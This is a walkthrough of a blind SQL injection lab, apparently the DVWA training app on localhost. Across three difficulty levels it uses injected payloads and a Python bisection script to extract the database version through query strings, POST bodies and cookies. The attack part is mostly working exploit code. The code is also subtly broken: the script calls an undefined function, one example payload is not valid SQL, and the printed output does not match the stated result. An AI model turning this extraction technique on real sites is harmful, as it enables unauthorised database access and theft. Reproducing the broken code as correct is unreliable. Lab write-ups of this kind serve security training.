# SQL Injection (Blind)

Objective

Find the version of the SQL database software through a blind SQL attack.

**I'd highly recommend finishing the SQL injection challenge first.**

## low

We can use bisection method on each character and concat them later.

Firstly we extend the query to some conditional selection:  
`1' AND SELECT VERSION()=??;#`.

To check string length:  
`1' AND SELECT LENGTH(VERSION())=??;#`

To check a character:  
`1' AND SELECT SUBSTR(VERSION(),?,1)=??;#`

Combine them in a python script it should look like this:  
```py
import requests
import urllib.parse
import re

PHPSESSID = 'aar5o16ckg3gdd9eqneruhcjr5'
SECURITY = 'low'
SUCCESS = 'User ID exists in the database.'
FAILURE = 'User ID is MISSING from the database.'

def query_by_get(data):
    data = urllib.parse.quote_plus(data.encode())
    response = requests.get(
        url=f'http://localhost:9999/vulnerabilities/sqli_blind/?id={data}&Submit=Submit',
        headers={'Cookie': f'PHPSESSID={PHPSESSID}; security={SECURITY}'}
    )
    return re.search(FAILURE, response.text) is None

def crack_length():
    print('[-] cracking length')

    template = "1' AND LENGTH(VERSION()){}{};#"
    lower, upper = 1, 100
    while True:
        # print(f'[-] cracking {lower}, {upper}')
        if upper == lower + 1:
            if query_by_post(template.format('=', lower)):
                print(f'[+] Success! length={lower}')
                return lower
            else:
                break
        mid = (lower + upper) // 2
        if query_by_post(template.format('<', mid)):
            upper = mid
        else:
            lower = mid

    print('[-] crack length failed!')
    return False

def crack_characters(length):
    print('[-] cracking characters')

    template = "1' AND SUBSTR(VERSION(),{},1){}{}#"
    s = ""
    for i in range(1, length+1):
        lower, upper = 33, 127
        while True:
            if upper == lower + 1:
                if query_by_post(template.format(i, '=', hex(lower))):
                    print(f'[+] found s[{i}]={chr(lower)}')
                    s += chr(lower)
                    break
                else:
                    print(f'[-] failed at s[{i}]')
                    return False
            mid = (lower + upper) // 2
            if query_by_post(template.format(i, '<', hex(mid))):
                upper = mid
            else:
                lower = mid

    print(f'[+] Success! s={s}')
    return s

if __name__ == '__main__':
    # print(query_by_post('1'))
    # True
    # print(query_by_post('999'))
    # False
    version_s = crack_characters(crack_length())
    print(version_s)
    # 10.1.26-MArIADB-0+DEB9u1
```

> 10.1.26-MariaDB-0+deb9u1

## medium

In this challenge we inject our selection after an integer, so the single 
quote in the template is not necessary any more.  
```py
def query_by_post(data):
    data = urllib.parse.quote_plus(data.encode())
    response = requests.post(
        url='http://localhost:9999/vulnerabilities/sqli_blind/',
        data=f'id={data}&Submit=Submit',
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'PHPSESSID={PHPSESSID}; security={SECURITY}'
        }
    )
    return re.search(FAILURE, response.text) is None

# template = "1 AND LENGTH(VERSION()){}{};#"
# template = "1 AND SUBSTR(VERSION(),{},1){}{}#"
```

## high

It is tricky that the form webpage only sets our cookie to the selected id with
no specific responses. When we go back to the original page the server 
reads our cookie and sends us the status message.

However, we could manually set the cookie and query the original page. So our
script can be modified like this:  
```py
def query_by_get(data):
    data = urllib.parse.quote_plus(data.encode())
    response = requests.get(
        url=f'http://localhost:9999/vulnerabilities/sqli_blind/',
        headers={'Cookie': f'id={data}; PHPSESSID={PHPSESSID}; security={SECURITY}'}
    )
    return re.search(FAILURE, response.text) is None
```
